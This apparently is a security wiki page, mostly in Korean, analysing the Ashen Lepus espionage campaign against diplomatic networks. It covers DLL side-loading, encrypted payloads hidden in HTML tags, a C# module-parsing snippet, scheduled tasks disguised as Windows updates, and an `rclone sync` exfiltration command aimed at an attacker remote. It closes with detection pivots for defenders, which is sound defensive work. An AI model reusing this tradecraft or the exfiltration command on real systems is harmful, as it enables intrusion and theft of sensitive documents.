# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## 전술 개요

Ashen Lepus (aka WIRTE)는 재현 가능한 패턴을 무기화하여 DLL sideloading, staged HTML payloads, 및 modular .NET backdoors를 연쇄적으로 결합함으로써 중동 외교 네트워크에 지속적으로 상주(persist)했다. 이 기법은 다음에 의존하기 때문에 다른 운영자도 재사용 가능하다:

- **Archive-based social engineering**: 정상적인 PDF가 대상에게 파일 공유 사이트에서 RAR 아카이브를 내려받도록 지시한다. 아카이브에는 실제처럼 보이는 문서 뷰어 EXE, 신뢰되는 라이브러리 이름을 딴 악성 DLL(예: `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), 그리고 미끼 `Document.pdf`가 번들로 포함된다.
- **DLL search order abuse**: 사용자가 EXE를 더블클릭하면 Windows는 현재 디렉터리에서 DLL import를 해결하고, 악성 로더(AshenLoader)가 신뢰된 프로세스 내부에서 실행되는 동안 미끼 PDF가 열려 의심을 피한다.
- **Living-off-the-land staging**: 이후 모든 단계(AshenStager → AshenOrchestrator → modules)는 필요할 때까지 디스크에 남기지 않고, 평범해 보이는 HTML 응답 내부에 숨겨진 암호화된 블롭으로 전달된다.

## 다단계 Side-Loading 체인

1. **Decoy EXE → AshenLoader**: EXE는 AshenLoader를 side-load하고, AshenLoader는 호스트 정찰을 수행한 뒤 자체를 AES-CTR로 암호화하여 `token=`, `id=`, `q=`, 또는 `auth=` 같은 회전하는 매개변수 내부에 POST로 전송하고 `/api/v2/account` 같은 API처럼 보이는 경로로 보낸다.
2. **HTML extraction**: C2는 클라이언트 IP가 목표 지역으로 지리적 위치가 확인되고 `User-Agent`가 임플란트와 일치할 때만 다음 단계를 노출해 샌드박스를 회피한다. 검사에 통과하면 HTTP 본문에는 Base64/AES-CTR로 암호화된 AshenStager 페이로드가 담긴 `<headerp>...</headerp>` 블롭이 포함된다.
3. **Second sideload**: AshenStager는 `wtsapi32.dll`을 import하는 또 다른 정상적인 바이너리로 배포된다. 해당 바이너리에 주입된 악성 복사본은 더 많은 HTML을 가져오며, 이번에는 `<article>...</article>`을 carve하여 AshenOrchestrator를 복원한다.
4. **AshenOrchestrator**: Base64 JSON config를 디코드하는 modular .NET 컨트롤러다. config의 `tg` 및 `au` 필드는 이어붙이거나 해시되어 AES 키를 만드는 데 사용되며, 이 키는 `xrk`를 복호화한다. 복호화된 바이트는 이후 가져오는 모든 모듈 블롭에 대해 XOR 키로 사용된다.
5. **Module delivery**: 각 모듈은 파서를 임의의 태그로 리다이렉트하는 HTML 주석을 통해 기술되어 `<headerp>` 또는 `<article>`만 찾는 정적 규칙을 깨트린다. 모듈에는 persistence(`PR*`), uninstallers(`UN*`), reconnaissance(`SN`), screen capture(`SCT`), file exploration(`FE`) 등이 포함된다.

### HTML 컨테이너 파싱 패턴
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Even if defenders block or strip a specific element, the operator only needs to change the tag hinted in the HTML comment to resume delivery.

## 암호화 및 C2 하드닝

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Recon smuggling**: 열거된 데이터에 이제 Program Files 목록이 포함되어 고가치 앱을 식별하고 호스트를 떠나기 전에 항상 암호화된다.
- **URI churn**: 쿼리 매개변수와 REST 경로가 캠페인마다 회전한다 (`/api/v1/account?token=` → `/api/v2/account?auth=`), 이에 따라 취약한 탐지는 무효화된다.
- **Gated delivery**: 서버는 지리적으로 제한되며 실제 implants에만 응답한다. 승인되지 않은 클라이언트에는 의심스럽지 않은 HTML을 반환한다.

## Persistence & Execution Loop

AshenStager는 Windows 유지관리 작업으로 위장한 예약 작업을 떨어뜨리고 `svchost.exe`를 통해 실행한다. 예:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

이 예약 작업들은 부팅 시 또는 주기적으로 sideloading 체인을 재실행하여 AshenOrchestrator가 디스크를 다시 건드리지 않고도 최신 모듈을 요청할 수 있게 한다.

## Benign Sync Clients를 사용한 Exfiltration

Operators는 전용 모듈을 통해 외교 문서를 `C:\Users\Public`(모두가 읽을 수 있고 의심스럽지 않은 위치)에 스테이징한 뒤, 합법적인 [Rclone](https://rclone.org/) 바이너리를 다운로드해 해당 디렉토리를 공격자 저장소와 동기화한다:

1. **Stage**: 대상 파일을 `C:\Users\Public\{campaign}\`로 복사/수집.
2. **Configure**: 공격자 제어의 HTTPS 엔드포인트(예: `api.technology-system[.]com`)를 가리키는 Rclone config 전송.
3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` 실행하여 트래픽이 일반적인 클라우드 백업처럼 보이게 함.

Rclone은 합법적인 백업 워크플로에서 널리 사용되므로, 방어자는 비정상적 실행(새 바이너리, 이상한 remote, 또는 `C:\Users\Public`의 갑작스런 동기화)에 주목해야 한다.

## Detection Pivots

- 서명된 프로세스가 사용자 쓰기 가능한 경로에서 DLL을 예기치 않게 로드하는 경우 경보(Procmon 필터 + `Get-ProcessMitigation -Module`), 특히 DLL 이름이 `netutils`, `srvcli`, `dwampi`, 또는 `wtsapi32`와 중복될 때에 주의.
- 의심스러운 HTTPS 응답에서 **특이한 태그 안에 포함된 큰 Base64 블랍** 또는 `<!-- TAG: <xyz> -->` 주석으로 보호된 내용을 검사.
- svchost.exe를 서비스가 아닌 인수로 실행하거나 dropper 디렉토리를 가리키는 예약 작업을 사냥.
- IT 관리 위치 밖에서 나타나는 Rclone 바이너리, 새로운 `rclone.conf` 파일, 또는 `C:\Users\Public` 같은 스테이징 디렉토리에서 가져오는 동기화 작업을 모니터링.

## 참고자료

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
